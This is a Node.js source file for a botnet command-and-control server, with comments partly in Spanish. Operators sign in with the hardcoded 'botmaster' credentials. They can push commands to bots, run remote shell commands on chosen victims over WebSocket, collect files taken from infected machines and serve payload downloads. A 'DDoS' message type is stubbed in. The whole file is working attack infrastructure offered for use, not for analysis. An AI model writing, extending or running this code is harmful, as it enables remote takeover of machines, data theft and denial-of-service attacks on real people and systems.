const http = require('http');
const https = require('https')
const WebSocket = require('ws');
const auth = require('basic-auth');
const { save_file } = require('./results_handlers')
const { setup } = require('./setup.js')
const fs = require("fs");

const port = 3000;
let clients = {};
let botmasters = {};

// Credentials of the botmaster
const botmasterUser = 'botmaster';
const botmasterPass = '1234';

const authenticate = (req, res) => {
    const credentials = auth(req);
    if (!credentials || credentials.name !== botmasterUser || credentials.pass !== botmasterPass) {
        res.writeHead(401, { 'WWW-Authenticate': 'Basic realm="Access Denied"' });
        res.end('Access denied');
        return false;
    }
    return true;
};

const options = {
    cert: fs.readFileSync('cert.pem'),
    key: fs.readFileSync('key.pem')
};

const server = https.createServer(options, (req, res) => {

    console.log(`http://${req.headers.host}`)
    const url = new URL(req.url, `http://${req.headers.host}`);
    console.log(url)

    console.log("Received a request.")

    if (!authenticate(req, res)) {
        console.log("Bad authentication.")
        return;
    }

    if (req.method === 'POST' && url.pathname === '/send-command') {

        let body = '';
        req.on('data', chunk => {
            body += chunk.toString();
        });
        req.on('end', () => {
            const command = JSON.parse(body);
            // Push the command to all connected clients

            Object.keys(clients).forEach(key => {
                if (clients[key].readyState === WebSocket.OPEN && (command.objective === key || command.objective === 'All')) {
                    clients[key].send(JSON.stringify(command));
                }
            });

            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ status: 'Command received and pushed to clients' }));
        });
    } else if (req.method === 'GET' && url.pathname === '/download') {

        const objective = url.searchParams.get('objective');
        const file_name = url.searchParams.get('filename');
        if (objective && file_name) {
            try {
                const data = fs.readFileSync("downloads/" + objective + "/" + file_name, 'utf-8');
                // TODO optional hash for integrity check
                const result = {
                    type: "Download",
                    name: file_name,
                    hash: 0,
                    data: data
                };
                res.writeHead(200, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify(result));
            } catch (err) {
                console.error("Error reading file:", err)
                res.writeHead(404, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ error: 'File not found' }));
            }

        } else {
            res.writeHead(404, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ error: 'File not found' }));
        }

    } else if (req.method === 'GET' && url.pathname === '/bots') {
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ bots: Object.keys(clients) }));

    } else {
        console.log("Unknown request method.")
        console.log(req.url, url.pathname, req.body)
        res.writeHead(404, { 'Content-Type': 'text/plain' });
        res.end('Not Found');
    }
});

const wss_server = https.createServer(options, (req, res) => {
    console.log("404.")
    res.writeHead(404, { 'Content-Type': 'text/plain' });
    res.end('Not Found');
});
const wss_shell = new WebSocket.Server({ server: wss_server });

wss_shell.on('connection', (ws, req) => {
    console.log('Nuevo botmaster conectado');
    const ip = req.socket.remoteAddress + ":" + req.socket.remotePort;
    console.log("IP: ", ip)
    botmasters[ip] = ws;
    ws.on('message', message => {
        console.log(`Recibido: ${message}`);
        const result = JSON.parse(message);
        console.log(Object.keys(clients))

        if (result.objective in clients) {
            const command = {
                id: result.id,
                sh_cmd: result.sh_cmd,
                botmaster: ip,
                command: 'Shell'

            }
            clients[result.objective].send(JSON.stringify(command))
        } else {
            ws.send(JSON.stringify({ error: 'Objective does not exist' }));
        }
    });
    ws.on('close', () => {
        console.log("Botmaster desconectado")
        delete botmasters[ip];
    });
});

const SHELL_PORT = 8080;
wss_server.listen(SHELL_PORT, () => {
    console.log("Shell open for BM access")
})

const wss = new WebSocket.Server({ server });

wss.on('connection', (ws, req) => {
    const ip = req.connection.remoteAddress;

    console.log('New WebSocket connection from:', ip);

    clients[ip] = ws;
    ws.on('message', message => {
        const result = JSON.parse(message);
        switch (result.type) {
            case "DDoS":
                break;
            case "Download":
                console.log('Received result from client: ', ip);
                save_file(result, ip)
                break;

            case "Exec":
                break;

            case "Shell":
                console.log('Received shell result from client: ', ip)

                botmasters[result.botmaster].send(result.result)
                break;

            default:
                console.log("Comando no reconocido.")
                break;
        }
        // Handle client result, e.g., store it in a database
    });

    ws.on('close', () => {
        clients = clients.filter(client => client !== ws);
    });
});

setup();
server.listen(port, () => {
    console.log(`Server is listening on port ${port}`);
});
